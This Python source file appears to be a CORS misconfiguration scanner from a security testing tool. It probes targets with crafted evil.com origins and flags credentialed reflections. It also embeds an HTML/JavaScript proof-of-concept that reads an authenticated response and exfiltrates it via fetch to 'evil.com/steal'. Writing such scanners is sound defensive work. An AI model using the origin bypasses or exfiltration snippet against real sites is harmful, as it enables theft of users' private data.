"""
BEATRIX CORS Scanner

Detects CORS misconfigurations that could allow cross-origin attacks.

Based on real-world findings (Anduril login.developer.anduril.com confirmed vuln).

Checks:
- Reflected Origin in ACAO header
- Null origin allowed
- Wildcard with credentials
- Subdomain matching bypass
- Protocol downgrade (https -> http)
- Special character bypass (_, -, etc.)

Reference: https://portswigger.net/web-security/cors
"""

import asyncio
from typing import AsyncIterator, Dict, List, Optional
from urllib.parse import urlparse

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext


class CORSScanner(BaseScanner):
    """
    CORS Misconfiguration Scanner

    Tests for various CORS bypass techniques that could allow
    an attacker to read sensitive data cross-origin.
    """

    name = "cors"
    description = "CORS misconfiguration scanner"
    version = "1.0.0"

    checks = [
        "reflected_origin",
        "null_origin",
        "wildcard_credentials",
        "subdomain_bypass",
        "protocol_downgrade",
        "special_chars",
    ]

    owasp_category = "A01:2021"  # Broken Access Control
    mitre_technique = "T1557"    # Adversary-in-the-Middle

    # Evil domains for testing
    EVIL_DOMAIN = "evil.com"

    def __init__(self, config=None):
        super().__init__(config)
        self.test_origins: List[str] = []

    def _generate_test_origins(self, target_url: str) -> List[dict]:
        """
        Generate malicious origins to test against the target.

        Returns list of dicts with 'origin', 'name', and 'severity'.
        """
        parsed = urlparse(target_url)
        target_domain = parsed.netloc

        # Extract base domain (e.g., example.com from sub.example.com)
        parts = target_domain.split(".")
        if len(parts) >= 2:
            base_domain = ".".join(parts[-2:])
        else:
            base_domain = target_domain

        tests = [
            # Direct reflection - CRITICAL if allowed
            {
                "origin": f"https://{self.EVIL_DOMAIN}",
                "name": "reflected_origin",
                "description": "Arbitrary origin reflection",
                "severity": Severity.CRITICAL,
            },

            # Null origin - often misconfigured
            {
                "origin": "null",
                "name": "null_origin",
                "description": "Null origin allowed",
                "severity": Severity.HIGH,
            },

            # Subdomain prefix attack (evilexample.com)
            {
                "origin": f"https://{self.EVIL_DOMAIN}{base_domain}",
                "name": "prefix_bypass",
                "description": "Domain prefix bypass",
                "severity": Severity.HIGH,
            },

            # Subdomain suffix attack (example.com.evil.com)
            {
                "origin": f"https://{base_domain}.{self.EVIL_DOMAIN}",
                "name": "suffix_bypass",
                "description": "Domain suffix bypass",
                "severity": Severity.HIGH,
            },

            # Protocol downgrade (http instead of https)
            {
                "origin": f"http://{target_domain}",
                "name": "protocol_downgrade",
                "description": "HTTP origin accepted for HTTPS target",
                "severity": Severity.MEDIUM,
            },

            # Underscore bypass (some regex fails on this)
            {
                "origin": f"https://{base_domain}_.{self.EVIL_DOMAIN}",
                "name": "underscore_bypass",
                "description": "Underscore character bypass",
                "severity": Severity.HIGH,
            },

            # Backtick bypass
            {
                "origin": f"https://{base_domain}`{self.EVIL_DOMAIN}",
                "name": "backtick_bypass",
                "description": "Backtick character bypass",
                "severity": Severity.HIGH,
            },

            # Trusted subdomain (if we can find XSS, game over)
            {
                "origin": f"https://evil.{base_domain}",
                "name": "subdomain_injection",
                "description": "Arbitrary subdomain accepted",
                "severity": Severity.MEDIUM,
            },
        ]

        return tests

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Main CORS scan - test all bypass techniques.

        Enhanced: tests with authentication headers and checks preflight (OPTIONS).
        """
        self.log(f"Starting CORS scan on {context.url}")

        # Generate test cases
        tests = self._generate_test_origins(context.url)

        # Run tests concurrently — standard GET with Origin header
        tasks = [
            self._test_origin(context.url, test)
            for test in tests
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Finding):
                yield result
            elif isinstance(result, Exception):
                self.log(f"Error during scan: {result}")

        # Also test with authentication headers if available
        # Lesson from Zooplus: CORS with credentials on authenticated endpoints
        # is what makes a finding impactful (PII leakage)
        if context.cookies or context.headers:
            auth_headers = {}
            if context.headers:
                # Pass through any auth-related headers
                for k, v in context.headers.items():
                    if k.lower() in ('authorization', 'cookie', 'x-csrf-token', 'x-api-key'):
                        auth_headers[k] = v
            if context.cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in context.cookies.items())
                auth_headers["Cookie"] = cookie_str

            if auth_headers:
                auth_tasks = [
                    self._test_origin_with_auth(context.url, test, auth_headers)
                    for test in tests[:5]  # Limit to top 5 bypass techniques with auth
                ]
                auth_results = await asyncio.gather(*auth_tasks, return_exceptions=True)
                for result in auth_results:
                    if isinstance(result, Finding):
                        yield result

        # Test OPTIONS preflight
        async for finding in self._test_preflight(context.url, tests):
            yield finding

    async def _test_origin_with_auth(self, url: str, test: dict,
                                      auth_headers: Dict[str, str]) -> Optional[Finding]:
        """
        Test CORS with authenticated request.

        This is the HIGH-VALUE check: if CORS is misconfigured AND the endpoint
        returns PII when authenticated, attacker can steal user data cross-origin.
        """
        origin = test["origin"]

        try:
            headers = {
                "Origin": origin,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                **auth_headers,
            }

            response = await self.get(url, headers=headers)

            acao = response.headers.get("access-control-allow-origin", "")
            acac = response.headers.get("access-control-allow-credentials", "")

            vuln = self._analyze_cors_response(origin, acao, acac, test)

            if vuln:
                # Check if authenticated response contains PII
                pii_detected = self._detect_pii_in_cors_response(response.text)

                finding = self._create_cors_finding(url, origin, acao, acac, test, response)

                if pii_detected:
                    finding.description += f"\n\n**CRITICAL: Authenticated response contains PII:** {', '.join(pii_detected.keys())}"
                    finding.description += "\nAn attacker can steal this PII from authenticated users via cross-origin request."
                    finding.severity = Severity.CRITICAL
                    finding.title = f"[AUTH] {finding.title}"
                    finding.evidence = (finding.evidence or "") + f"\n\nPII in response: {', '.join(pii_detected.keys())}"

                return finding

        except Exception as e:
            self.log(f"Error testing authenticated CORS {origin}: {e}")

        return None

    async def _test_preflight(self, url: str, tests: list) -> AsyncIterator[Finding]:
        """
        Test CORS preflight (OPTIONS) requests.

        Some servers respond differently to OPTIONS vs GET for CORS headers.
        Also checks Access-Control-Allow-Methods and Access-Control-Allow-Headers.
        """
        for test in tests[:3]:  # Test top 3 bypasses via preflight
            origin = test["origin"]
            try:
                response = await self.request(
                    "OPTIONS", url,
                    headers={
                        "Origin": origin,
                        "Access-Control-Request-Method": "PUT",
                        "Access-Control-Request-Headers": "Authorization, Content-Type",
                    }
                )

                acao = response.headers.get("access-control-allow-origin", "")
                acac = response.headers.get("access-control-allow-credentials", "")
                acam = response.headers.get("access-control-allow-methods", "")
                acah = response.headers.get("access-control-allow-headers", "")

                if self._analyze_cors_response(origin, acao, acac, test):
                    evidence = f"""CORS Preflight Misconfiguration!

OPTIONS Request:
  Origin: {origin}
  Access-Control-Request-Method: PUT
  Access-Control-Request-Headers: Authorization, Content-Type

Response:
  Access-Control-Allow-Origin: {acao}
  Access-Control-Allow-Credentials: {acac}
  Access-Control-Allow-Methods: {acam}
  Access-Control-Allow-Headers: {acah}

This allows cross-origin write requests (PUT/PATCH/DELETE) from attacker-controlled origins.
"""
                    # Preflight allowing write methods is extra dangerous
                    severity = test["severity"]
                    if acac.lower() == "true":
                        severity = Severity.CRITICAL
                    elif any(m in acam.upper() for m in ['PUT', 'PATCH', 'DELETE']):
                        severity = Severity.HIGH

                    yield self.create_finding(
                        title=f"CORS Preflight Misconfiguration: {test['description']} (write methods allowed)",
                        severity=severity,
                        confidence=Confidence.CERTAIN if acac.lower() == "true" else Confidence.FIRM,
                        url=url,
                        description=f"The OPTIONS preflight response allows '{origin}' to make write requests ({acam}). "
                                    f"Combined with credentials support, this enables cross-origin state-changing attacks.",
                        evidence=evidence,
                        remediation="Restrict Access-Control-Allow-Methods to only necessary methods. "
                                    "Never allow write methods from untrusted origins.",
                    )

            except Exception as e:
                self.log(f"Preflight error: {e}")

    def _detect_pii_in_cors_response(self, response_text: str) -> Dict[str, bool]:
        """Detect PII patterns to assess CORS misconfiguration impact"""
        import re
        pii_patterns = {
            'email': re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
            'phone': re.compile(r'(?:\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}'),
            'address': re.compile(r'"(?:street|address|city|zipCode|postalCode|zip_code)"', re.I),
            'name': re.compile(r'"(?:firstName|lastName|full_?name|displayName)"', re.I),
        }
        found = {}
        for pii_type, pattern in pii_patterns.items():
            if pattern.search(response_text):
                found[pii_type] = True
        return found

    async def _test_origin(self, url: str, test: dict) -> Optional[Finding]:
        """
        Test a single origin against the target.

        Returns Finding if vulnerable, None otherwise.
        """
        origin = test["origin"]

        try:
            response = await self.get(
                url,
                headers={
                    "Origin": origin,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                }
            )

            # Check for CORS headers
            acao = response.headers.get("access-control-allow-origin", "")
            acac = response.headers.get("access-control-allow-credentials", "")

            # Analyze the response
            vuln = self._analyze_cors_response(origin, acao, acac, test)

            if vuln:
                return self._create_cors_finding(url, origin, acao, acac, test, response)

        except Exception as e:
            self.log(f"Error testing origin {origin}: {e}")

        return None

    def _analyze_cors_response(
        self,
        origin: str,
        acao: str,
        acac: str,
        test: dict,
    ) -> bool:
        """
        Analyze CORS response headers for vulnerabilities.

        Returns True if vulnerable.
        """
        # No ACAO header = not vulnerable (no CORS)
        if not acao:
            return False

        # Wildcard with credentials - browser blocks this but indicates misconfiguration
        if acao == "*" and acac.lower() == "true":
            return True

        # Origin reflected back — check all test types
        if acao == origin:
            test_name = test["name"]

            # Direct evil domain reflection
            if test_name == "reflected_origin":
                return True

            # Null origin allowed
            if origin == "null":
                return True

            # All bypass techniques: if our crafted origin is reflected, it's vulnerable
            if test_name in [
                "prefix_bypass", "suffix_bypass", "underscore_bypass",
                "backtick_bypass", "subdomain_injection", "protocol_downgrade"
            ]:
                return True

        return False

    def _create_cors_finding(
        self,
        url: str,
        origin: str,
        acao: str,
        acac: str,
        test: dict,
        response,
    ) -> Finding:
        """Create a CORS vulnerability finding"""

        # Determine actual severity based on credentials
        severity = test["severity"]
        if acac.lower() == "true":
            # Credentials allowed = upgrade severity
            if severity == Severity.MEDIUM:
                severity = Severity.HIGH
            elif severity == Severity.HIGH:
                severity = Severity.CRITICAL

        evidence = f"""CORS Misconfiguration Detected!

Request Origin: {origin}
Response Headers:
  Access-Control-Allow-Origin: {acao}
  Access-Control-Allow-Credentials: {acac}

Bypass Type: {test['description']}
"""

        f"""<!-- CORS PoC - {test['name']} -->
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '{url}', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        console.log('Response:', xhr.responseText);
        // Exfiltrate to attacker server
        fetch('https://evil.com/steal?data=' + encodeURIComponent(xhr.responseText));
    }}
}};
xhr.send();
</script>
</body>
</html>"""

        remediation = """1. Implement a strict allowlist of trusted origins
2. Never reflect the Origin header without validation
3. Don't use wildcards (*) with credentials
4. Validate origin against exact domain matches, not substrings
5. Don't trust null origin
6. Consider using a CORS library that handles edge cases"""

        return self.create_finding(
            title=f"CORS Misconfiguration: {test['description']}",
            severity=severity,
            confidence=Confidence.CERTAIN if acac.lower() == "true" else Confidence.FIRM,
            url=url,
            description=f"""The application has a CORS misconfiguration that allows the origin '{origin}' to read responses.

{test['description']}

This can be exploited by an attacker to steal sensitive data from authenticated users by hosting a malicious page that makes cross-origin requests to this endpoint.""",
            evidence=evidence,
            request=f"GET {url}\nOrigin: {origin}",
            response=f"HTTP/1.1 {response.status_code}\nAccess-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
            remediation=remediation,
            references=[
                "https://portswigger.net/web-security/cors",
                "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny",
                "https://book.hacktricks.xyz/pentesting-web/cors-bypass",
            ],
        )

    async def passive_scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Passive CORS analysis - check existing response for misconfigurations.
        """
        if not context.response:
            return

        headers = context.response.headers
        acao = headers.get("access-control-allow-origin", "")
        acac = headers.get("access-control-allow-credentials", "")

        # Check for obvious misconfigurations
        if acao == "*" and acac.lower() == "true":
            yield self.create_finding(
                title="CORS Wildcard with Credentials",
                severity=Severity.HIGH,
                confidence=Confidence.CERTAIN,
                url=context.url,
                description="The server returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. This is a misconfiguration that browsers will block, but indicates poor CORS understanding.",
                evidence=f"ACAO: {acao}\nACAC: {acac}",
                remediation="Use a specific origin instead of wildcard when credentials are required.",
            )

        if acao == "null":
            yield self.create_finding(
                title="CORS Allows Null Origin",
                severity=Severity.MEDIUM,
                confidence=Confidence.FIRM,
                url=context.url,
                description="The server explicitly allows the 'null' origin. This can be exploited using sandboxed iframes or local files.",
                evidence=f"ACAO: {acao}",
                remediation="Do not allow null origin in CORS configuration.",
            )
